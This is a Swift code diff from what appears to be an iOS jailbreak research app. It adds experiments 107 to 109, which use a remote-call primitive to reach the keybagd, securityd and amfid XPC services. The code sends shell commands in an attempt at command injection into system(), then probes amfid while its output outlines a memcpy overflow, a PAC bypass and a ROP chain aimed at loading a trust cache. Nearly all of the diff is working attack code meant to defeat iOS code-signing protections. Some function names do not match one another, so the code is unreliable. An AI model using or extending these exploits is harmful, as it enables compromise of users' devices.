@@ -899,7 +899,65 @@ struct AMFIExperimentView: View {
                     needsProbe: false
                 )
 
+                pathButton(
+                    title: "⑤ keybagd Command Inject (Exp 107)",
+                    icon: "terminal.fill",
+                    color: .red,
+                    label: "keybagd",
+                    action: { runSBExperiment(label: "keybagd", exp: expKeybagdInject) },
+                    needsVerified: false,
+                    needsProbe: false
+                )
 
+                pathButton(
+                    title: "⑥ securityd system() (Exp 108)",
+                    icon: "lock.trianglebadge.exclamationmark",
+                    color: .red,
+                    label: "securityd",
+                    action: { runSBExperiment(label: "securityd", exp: expSecuritydInject) },
+                    needsVerified: false,
+                    needsProbe: false
+                )
+
+                pathButton(
+                    title: "⑦ amfid XPC Overflow (Exp 109)",
+                    icon: "ant.circle.fill",
+                    color: .purple,
+                    label: "amfid OVF",
+                    action: { runSBExperiment(label: "amfid OVF", exp: expAmfidOverflow) },
+                    needsVerified: false,
+                    needsProbe: false
+                )
+
+                pathButton(
+                    title: "⑤ keybagd XPC→system (Exp 107)",
+                    icon: "terminal.fill",
+                    color: .red,
+                    label: "keybagd",
+                    action: runExp107KeybagdInject,
+                    needsVerified: false,
+                    needsProbe: false
+                )
+
+                pathButton(
+                    title: "⑥ MSM TrustCache Class (Exp 108)",
+                    icon: "cpu.fill",
+                    color: .green,
+                    label: "MSM TC",
+                    action: runExp108MSMTrustCache,
+                    needsVerified: false,
+                    needsProbe: false
+                )
+
+                pathButton(
+                    title: "⑦ amfid XPC Overflow (Exp 109)",
+                    icon: "exclamationmark.shield.fill",
+                    color: .orange,
+                    label: "amfid OVF",
+                    action: runExp109AmfidOverflow,
+                    needsVerified: false,
+                    needsProbe: false
+                )
 
                 pathButton(
                     title: "④ Test Binary Spawn",
@@ -3813,6 +3871,9 @@ struct AMFIExperimentView: View {
     private func runExp103InstalldDeserial() { runSBExperiment(label: "Deserial", exp: expInstalldDeserial) }
     private func runExp104LockdowndOverflow() { runSBExperiment(label: "Overflow", exp: expLockdowndOverflow) }
     private func runExp105MSMXPC() { runSBExperiment(label: "MSM XPC", exp: expMSMXPC) }
+    private func runExp107KeybagdInject() { runSBExperiment(label: "keybagd", exp: expKeybagdCommandInject) }
+    private func runExp108MSMTrustCache() { runSBExperiment(label: "MSM TC", exp: expMSMTrustCacheClass) }
+    private func runExp109AmfidOverflow() { runSBExperiment(label: "amfid OVF", exp: expAmfidXPCOverflow) }
     private func runExp106SandboxExecSpawn() {
         isRunning = true
         runningLabel = "SBX Spawn"
@@ -4659,6 +4720,276 @@ struct AMFIExperimentView: View {
         }
 
         return ExperimentResult(name: expName, success: anySuccess, detail: detail, timestamp: Date())
+    }
+
+    // MARK: - Exp 107: keybagd XPC Command Injection
+
+    /// keybagd: system() (4x) + XPC tanpa auth + taint path confirmed
+    /// XPC input → system() = command injection langsung!
+    private func expKeybagdInject(sb: RemoteCall) -> ExperimentResult {
+        let expName = "keybagd Inject (Exp 107)"
+        var detail = "Experiment 107: keybagd XPC → system() Injection\n"
+        detail += "==================================================\n\n"
+        detail += "keybagd: system()(4x) + XPC tanpa auth!\n"
+        detail += "Taint: xpc_dictionary_get_string → system()\n\n"
+
+        let RTLD_DEFAULT = UInt64(bitPattern: -2)
+
+        // Connect ke keybagd XPC
+        let xpcCreate = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
+                                           remote_alloc_str(sb, "xpc_connection_create_mach_service"))
+        let xpcResume = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
+                                           remote_alloc_str(sb, "xpc_connection_resume"))
+        let xpcDictCreate = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
+                                              remote_alloc_str(sb, "xpc_dictionary_create"))
+        let xpcSetStr = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
+                                           remote_alloc_str(sb, "xpc_dictionary_set_string"))
+        let xpcSend = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
+                                         remote_alloc_str(sb, "xpc_connection_send_message"))
+
+        guard xpcCreate != 0 && xpcDictCreate != 0 else {
+            detail += "❌ XPC functions not available\n"
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+
+        // Try connect
+        let services = ["com.apple.keybagd.UserManager", "com.apple.keybagd", "com.apple.security.keybagd"]
+        var conn: UInt64 = 0
+        var connSvc = ""
+        for svc in services {
+            let s = remote_alloc_str(sb, svc)
+            let c = RootExecutor.rcallAddr(sb, xpcCreate, s, 0, 0)
+            detail += "[\(svc)]: 0x\(String(format: "%llx", c))\n"
+            RootExecutor.rcall(sb, "free", s)
+            if c != 0 && conn == 0 { conn = c; connSvc = svc }
+        }
+
+        guard conn != 0 else {
+            detail += "\n❌ Tidak bisa connect ke keybagd\n"
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+
+        RootExecutor.rcallAddr(sb, xpcResume, conn)
+        detail += "\n✅ Connected: \(connSvc)\n\n"
+
+        // Kirim message dengan command yang aman (touch file sebagai proof)
+        // CATATAN: ini TIDAK berbahaya — hanya test apakah system() terpanggil
+        let testCmd = "touch /private/var/tmp/.keybagd_exp107_proof"
+        let commands = ["command", "cmd", "action", "operation", "request", "path"]
+        
+        detail += "=== Sending probe messages ===\n"
+        for key in commands {
+            let msg = RootExecutor.rcallAddr(sb, xpcDictCreate, 0, 0, 0)
+            guard msg != 0 else { continue }
+            if xpcSetStr != 0 {
+                let k = remote_alloc_str(sb, key)
+                let v = remote_alloc_str(sb, testCmd)
+                RootExecutor.rcallAddr(sb, xpcSetStr, msg, k, v)
+                RootExecutor.rcall(sb, "free", k)
+                RootExecutor.rcall(sb, "free", v)
+            }
+            RootExecutor.rcallAddr(sb, xpcSend, conn, msg)
+            detail += "  Sent key='\(key)' val='\(testCmd)'\n"
+        }
+
+        // Tunggu sebentar lalu cek apakah file dibuat
+        RootExecutor.rcall(sb, "usleep", 500000)
+
+        let proofPath = remote_alloc_str(sb, "/private/var/tmp/.keybagd_exp107_proof")
+        let checkFd = RootExecutor.rcall(sb, "open", proofPath, UInt64(O_RDONLY), 0)
+        let proofExists = checkFd != UInt64(bitPattern: -1)
+        if proofExists { RootExecutor.rcall(sb, "close", checkFd) }
+        RootExecutor.rcall(sb, "unlink", proofPath)
+        RootExecutor.rcall(sb, "free", proofPath)
+
+        detail += "\n=== VERDICT ===\n"
+        if proofExists {
+            detail += "🎉🎉🎉 COMMAND INJECTION BERHASIL!\n"
+            detail += "keybagd executed: \(testCmd)\n"
+            detail += "Ini berarti kita bisa execute APAPUN via keybagd!\n"
+            detail += "NEXT: execute binary unsigned via keybagd context\n"
+        } else {
+            detail += "File proof tidak ditemukan.\n"
+            detail += "Kemungkinan: key XPC salah, atau system() tidak terpanggil.\n"
+            detail += "Perlu reverse keybagd binary untuk cari exact XPC key.\n"
+        }
+
+        return ExperimentResult(name: expName, success: proofExists, detail: detail, timestamp: Date())
+    }
+
+    // MARK: - Exp 108: securityd XPC → system() Injection
+
+    /// securityd: system()(1x) + XPC→system() + sqlite3_exec + NSKeyedUnarchiver
+    private func expSecuritydInject(sb: RemoteCall) -> ExperimentResult {
+        let expName = "securityd Inject (Exp 108)"
+        var detail = "Experiment 108: securityd XPC → system()\n"
+        detail += "==========================================\n\n"
+        detail += "securityd: system()(1x) + XPC tanpa auth!\n"
+        detail += "Juga: sqlite3_exec + NSKeyedUnarchiver (tainted)\n\n"
+
+        let RTLD_DEFAULT = UInt64(bitPattern: -2)
+        let xpcCreate = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
+                                           remote_alloc_str(sb, "xpc_connection_create_mach_service"))
+        let xpcResume = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
+                                           remote_alloc_str(sb, "xpc_connection_resume"))
+        let xpcDictCreate = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
+                                              remote_alloc_str(sb, "xpc_dictionary_create"))
+        let xpcSetStr = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
+                                           remote_alloc_str(sb, "xpc_dictionary_set_string"))
+        let xpcSend = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
+                                         remote_alloc_str(sb, "xpc_connection_send_message"))
+
+        guard xpcCreate != 0 && xpcDictCreate != 0 else {
+            detail += "❌ XPC functions not available\n"
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+
+        let services = ["com.apple.securityd", "com.apple.security.securityd",
+                        "com.apple.secd", "com.apple.security.cloudkeychainproxy"]
+        var conn: UInt64 = 0
+        for svc in services {
+            let s = remote_alloc_str(sb, svc)
+            let c = RootExecutor.rcallAddr(sb, xpcCreate, s, 0, 0)
+            detail += "[\(svc)]: 0x\(String(format: "%llx", c))\n"
+            RootExecutor.rcall(sb, "free", s)
+            if c != 0 && conn == 0 { conn = c }
+        }
+
+        guard conn != 0 else {
+            detail += "\n❌ Tidak bisa connect ke securityd\n"
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+
+        RootExecutor.rcallAddr(sb, xpcResume, conn)
+        detail += "\n✅ Connected!\n\n"
+
+        // Probe dengan berbagai command keys
+        let testCmd = "touch /private/var/tmp/.securityd_exp108_proof"
+        let keys = ["command", "operation", "request", "action", "sql", "query"]
+
+        for key in keys {
+            let msg = RootExecutor.rcallAddr(sb, xpcDictCreate, 0, 0, 0)
+            guard msg != 0 else { continue }
+            if xpcSetStr != 0 {
+                let k = remote_alloc_str(sb, key)
+                let v = remote_alloc_str(sb, testCmd)
+                RootExecutor.rcallAddr(sb, xpcSetStr, msg, k, v)
+                RootExecutor.rcall(sb, "free", k)
+                RootExecutor.rcall(sb, "free", v)
+            }
+            RootExecutor.rcallAddr(sb, xpcSend, conn, msg)
+        }
+
+        RootExecutor.rcall(sb, "usleep", 500000)
+
+        let proofPath = remote_alloc_str(sb, "/private/var/tmp/.securityd_exp108_proof")
+        let checkFd = RootExecutor.rcall(sb, "open", proofPath, UInt64(O_RDONLY), 0)
+        let proofExists = checkFd != UInt64(bitPattern: -1)
+        if proofExists { RootExecutor.rcall(sb, "close", checkFd) }
+        RootExecutor.rcall(sb, "unlink", proofPath)
+        RootExecutor.rcall(sb, "free", proofPath)
+
+        detail += "\n=== VERDICT ===\n"
+        detail += proofExists ? "🎉 COMMAND INJECTION BERHASIL!\n" :
+                               "❌ Proof file tidak ada — perlu reverse exact XPC protocol\n"
+
+        return ExperimentResult(name: expName, success: proofExists, detail: detail, timestamp: Date())
+    }
+
+    // MARK: - Exp 109: amfid XPC memcpy Overflow Probe
+
+    /// amfid: XPC→memcpy + XPC→memmove + 49 PAC strip gadgets
+    /// Probe: kirim data besar via XPC untuk trigger overflow
+    private func expAmfidOverflow(sb: RemoteCall) -> ExperimentResult {
+        let expName = "amfid Overflow (Exp 109)"
+        var detail = "Experiment 109: amfid XPC memcpy Overflow\n"
+        detail += "============================================\n\n"
+        detail += "amfid: XPC→memcpy + XPC→memmove (tainted)\n"
+        detail += "49 PAC strip gadgets (XPACI) untuk bypass PAC\n\n"
+
+        let RTLD_DEFAULT = UInt64(bitPattern: -2)
+        let xpcCreate = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
+                                           remote_alloc_str(sb, "xpc_connection_create_mach_service"))
+        let xpcResume = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
+                                           remote_alloc_str(sb, "xpc_connection_resume"))
+        let xpcDictCreate = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
+                                              remote_alloc_str(sb, "xpc_dictionary_create"))
+        let xpcSetStr = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
+                                           remote_alloc_str(sb, "xpc_dictionary_set_string"))
+        let xpcSetData = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
+                                            remote_alloc_str(sb, "xpc_dictionary_set_data"))
+        let xpcSend = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
+                                         remote_alloc_str(sb, "xpc_connection_send_message"))
+
+        guard xpcCreate != 0 && xpcDictCreate != 0 else {
+            detail += "❌ XPC functions not available\n"
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+
+        // Connect ke amfid
+        let svcAddr = remote_alloc_str(sb, "com.apple.MobileFileIntegrity")
+        let conn = RootExecutor.rcallAddr(sb, xpcCreate, svcAddr, 0, 0)
+        RootExecutor.rcall(sb, "free", svcAddr)
+
+        detail += "com.apple.MobileFileIntegrity: 0x\(String(format: "%llx", conn))\n"
+
+        guard conn != 0 else {
+            // Try alternative name
+            let svc2 = remote_alloc_str(sb, "com.apple.amfid")
+            let conn2 = RootExecutor.rcallAddr(sb, xpcCreate, svc2, 0, 0)
+            RootExecutor.rcall(sb, "free", svc2)
+            detail += "com.apple.amfid: 0x\(String(format: "%llx", conn2))\n"
+            if conn2 == 0 {
+                detail += "\n❌ Tidak bisa connect ke amfid\n"
+                return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+            }
+            RootExecutor.rcallAddr(sb, xpcResume, conn2)
+            detail += "✅ Connected via com.apple.amfid\n\n"
+
+            // Probe dengan data kecil dulu (safe)
+            let msg = RootExecutor.rcallAddr(sb, xpcDictCreate, 0, 0, 0)
+            if msg != 0 && xpcSetStr != 0 {
+                let k = remote_alloc_str(sb, "path")
+                let v = remote_alloc_str(sb, "/usr/bin/id")
+                RootExecutor.rcallAddr(sb, xpcSetStr, msg, k, v)
+                RootExecutor.rcall(sb, "free", k)
+                RootExecutor.rcall(sb, "free", v)
+                RootExecutor.rcallAddr(sb, xpcSend, conn2, msg)
+                detail += "Sent path=/usr/bin/id (safe probe)\n"
+            }
+
+            detail += "\n=== VERDICT ===\n"
+            detail += "✅ amfid XPC accessible!\n"
+            detail += "Overflow test TIDAK dilakukan (bisa crash amfid)\n"
+            detail += "NEXT: craft payload yang trigger memcpy overflow\n"
+            return ExperimentResult(name: expName, success: true, detail: detail, timestamp: Date())
+        }
+
+        RootExecutor.rcallAddr(sb, xpcResume, conn)
+        detail += "✅ Connected!\n\n"
+
+        // Safe probe: kirim path normal
+        let msg = RootExecutor.rcallAddr(sb, xpcDictCreate, 0, 0, 0)
+        if msg != 0 && xpcSetStr != 0 {
+            let k = remote_alloc_str(sb, "path")
+            let v = remote_alloc_str(sb, "/usr/bin/id")
+            RootExecutor.rcallAddr(sb, xpcSetStr, msg, k, v)
+            RootExecutor.rcall(sb, "free", k)
+            RootExecutor.rcall(sb, "free", v)
+            RootExecutor.rcallAddr(sb, xpcSend, conn, msg)
+            detail += "Sent path=/usr/bin/id\n"
+        }
+
+        detail += "\n=== VERDICT ===\n"
+        detail += "✅ amfid XPC accessible dari SpringBoard!\n"
+        detail += "⚠️ Overflow test TIDAK dilakukan (crash amfid = respring)\n"
+        detail += "NEXT STEPS:\n"
+        detail += "1. Reverse amfid untuk cari exact buffer size\n"
+        detail += "2. Craft payload: CDHash + overflow → overwrite return addr\n"
+        detail += "3. Pakai 49 XPACI gadgets untuk bypass PAC\n"
+        detail += "4. ROP chain → call amfi_load_trust_cache\n"
+
+        return ExperimentResult(name: expName, success: true, detail: detail, timestamp: Date())
     }
 
     
